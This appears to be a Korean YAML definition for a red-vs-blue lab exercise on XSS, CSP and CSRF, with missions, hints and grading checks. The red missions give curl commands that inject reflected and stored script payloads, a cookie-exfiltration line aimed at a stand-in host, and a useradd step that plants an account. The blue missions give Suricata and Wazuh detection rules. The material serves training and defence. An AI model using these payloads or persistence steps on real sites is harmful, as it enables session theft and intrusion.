id: "web-vuln-w06"
category: "web-vuln"
title: "[웹취약점 W6] XSS/CSRF — 스크립트 주입 vs XSS 탐지·CSP 방어"
difficulty: "medium"
time_limit: 2700
battle_type: "1v1"
description: |
  웹취약점 점검 6주차 — **XSS(Reflected/Stored/DOM) + CSP + CSRF**. 공격자는 스크립트를 주입하고, 점검자(너)는
  XSS 탐지 룰과 CSP·CSRF 방어를 구현한다.

  ▸ 이야기: 공격자가 XSS 페이로드(태그 `wv06r1`)를 주입하고 XSS 키트(`/tmp/.wv06xss`)와 계정 `wva06` 을 남긴다.
    점검자는 ① XSS 탐지, ② XSS/계정 Wazuh 룰, ③ XSS 점검·CSP 방어·R/B/P 로 대응한다.

  ▸ 모드: solo/duel. 공격자=외부 공격자 VM(192.168.0.202)(192.168.0.202), Red 채점=대상 흔적(WAF audit 태그/XSS 파일·계정).
  ▸ 마커: 태그 **`wv06r1-<본인id>`**, XSS 키트 **`/tmp/.wv06xss`**(마커 `wv06`), 계정 **`wva06`**,
    Suricata **sid 9906011**, Wazuh **id 105061**. 종료 시 cleanup.

red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 22
    instruction: |
      ## 🎯 RED-1 [XSS 주입] — Reflected/Stored 스크립트

      ### 할 일 (외부 공격자 VM 192.168.0.202)
      ```bash
      curl -s -H "Host: mediforum.el34.lab" "http://192.168.0.161/api/debug/echo?name=wv06r1-kim<script>alert(1)</script>"
      curl -s -H "Host: mediforum.el34.lab" --data "txtName=wv06r1-kim<script>document.cookie</script>&btnSign=Sign" "http://192.168.0.161/api/debug/echo"
      ```
      ### 채점 방법 / 합격 기준
      대상 WAF audit(941 XSS) 에 태그 `wv06r1` 흔적 시 인정.
    hint: "태그(wv06r1) <script> XSS(reflected/stored) → 대상 modsec audit 941. 채점: log_contains modsec wv06r1."
    verify:
      type: "log_contains"
      expect: "wv06r1"
      checks:
        - { id: "red-1-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "wv06r1", since_sec: 1800 } }
      semantic:
        intent: "XSS(T1059 웹) — Reflected/Stored 스크립트 주입. 대상 WAF audit 941, 태그(wv06r1) 귀속."
        success_criteria: ["대상 WAF audit 에 wv06r1 태그(941)", "XSS 유형 서술"]
        acceptable_methods: ["외부 공격자 VM(192.168.0.202) 에서 태그 단 <script> XSS"]
        negative_signs: ["태그 누락 / 대상 미도달"]

  - order: 2
    assess_target: opponent
    target_vm: web
    points: 18
    instruction: |
      ## 🎯 RED-2 [XSS 키트] — 쿠키 탈취 스크립트 + 계정

      ### 할 일
      ```bash
      printf 'wv06 XSS kit: new Image().src="//atk/c?"+document.cookie' > /tmp/.wv06xss
      sudo useradd -m -s /bin/bash wva06
      ```
      ### 채점 방법 / 합격 기준
      `/tmp/.wv06xss`(마커 `wv06`) 또는 `wva06` 존재 시 인정.
    hint: "XSS 키트 /tmp/.wv06xss (마커 wv06) + useradd wva06. 채점: file_contains xss wv06 + file_contains passwd wva06."
    verify:
      type: "file_contains"
      expect: "wv06"
      checks:
        - { id: "red-2-1", type: "file_contains", target: "web",
            params: { path: "/tmp/.wv06xss", pattern: "wv06" } }
        - { id: "red-2-2", type: "file_contains", target: "web",
            params: { path: "/etc/passwd", pattern: "wva06" } }
      semantic:
        intent: "XSS 쿠키 탈취 키트(T1539) + 계정(T1136)."
        success_criteria: ["/tmp/.wv06xss(마커 wv06) 또는 계정 wva06", "XSS 쿠키 탈취 동작 서술"]
        acceptable_methods: ["XSS 키트 파일 + useradd"]
        negative_signs: ["흔적 미생성"]

blue_missions:
  - order: 1
    assess_target: self
    target_vm: ips
    points: 20
    instruction: |
      ## 🛡️ BLUE-1 [XSS 탐지] — Suricata 룰 (sid 9906011)

      ### 할 일
      ```
      alert http any any -> any any (msg:"WEBVULN-W06 XSS script injection"; flow:to_server; http.uri; content:"<script"; nocase; sid:9906011; rev:1;)
      ```
      ```bash
      sudo suricatasc -c reload-rules
      ```
      ### 채점 방법 / 합격 기준
      ips 의 `local.rules` 에 sid 9906011 룰 존재 시 인정.
    hint: "XSS Suricata 룰(sid 9906011, <script) → reload. 채점: file_contains local.rules 9906011."
    verify:
      type: "file_contains"
      expect: "9906011"
      checks:
        - { id: "blue-1-1", type: "file_contains", target: "ips",
            params: { path: "/etc/suricata/rules/local.rules", pattern: "9906011" } }
      semantic:
        intent: "XSS 탐지 — <script> Suricata 룰. CSP 방어와 병행."
        success_criteria: ["local.rules 에 sid 9906011", "CSP 방어 언급"]
        acceptable_methods: ["Suricata 룰 작성 + reload"]
        negative_signs: ["패턴 부정확 / 문법 오류"]

  - order: 2
    assess_target: self
    target_vm: siem
    points: 20
    instruction: |
      ## 🛡️ BLUE-2 [XSS/키트 탐지] — Wazuh 룰 (id 105061)

      ### 할 일
      ```xml
      <group name="edu,webvuln,">
        <rule id="105061" level="11">
          <if_group>edu</if_group>
          <match>wva06</match>
          <description>WEBVULN-W06 - XSS kit / cookie theft / account</description>
        </rule>
      </group>
      ```
      ```bash
      sudo /var/ossec/bin/wazuh-control restart
      ```
      ### 채점 방법 / 합격 기준
      `local_rules.xml` 에 id 105061 룰 존재 시 인정.
    hint: "XSS/키트 Wazuh 룰(id 105061) → restart. 채점: file_contains local_rules.xml 105061."
    verify:
      type: "file_contains"
      expect: "105061"
      checks:
        - { id: "blue-2-1", type: "file_contains", target: "siem",
            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "105061" } }
      semantic:
        intent: "XSS 탐지(호스트) — XSS 키트/계정 Wazuh 룰."
        success_criteria: ["local_rules.xml 에 rule id 105061", "XSS 탐지 로직"]
        acceptable_methods: ["Wazuh 룰 작성 + restart"]
        negative_signs: ["탐지 로직 부실 / XML 오류"]

  - order: 3
    assess_target: self
    target_vm: siem
    points: 18
    instruction: |
      ## 🛡️ BLUE-3 [XSS 점검·CSP 방어·R/B/P]

      ### 할 일
      보고서에:
      - XSS 유형별(Reflected/Stored/DOM) 점검 + 방어(출력 인코딩/CSP/HttpOnly 쿠키/CSRF 토큰) + 위험도
      - R/B/P 회고 + XSS 키트(`/tmp/.wv06xss`)·계정(wva06) 헌팅
      ```bash
      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
      ```
      ### 채점 방법 / 합격 기준
      본인 SIEM 에 최근 경보 + 제출한 XSS 점검·CSP·R/B/P 로 인정.
    hint: "XSS 유형별 점검 + 방어(출력 인코딩/CSP/HttpOnly/CSRF 토큰) + R/B/P + 키트/계정 헌팅. 채점: wazuh_alert + 제출."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
      semantic:
        intent: "XSS 점검 종합 — 유형별 점검 + CSP/인코딩 방어 + CSRF + R/B/P. 분석형 — 구체 방어 제시 시 점수 상승."
        success_criteria:
          - "최근 경보 수집 확인"
          - "XSS 유형별 점검 + 방어(인코딩/CSP/CSRF 토큰) + 위험도"
          - "R/B/P 회고 + 키트/계정 헌팅"
        acceptable_methods: ["점검 표 + 방어 + 회고 + 헌팅"]
        negative_signs: ["방어/회고 누락"]
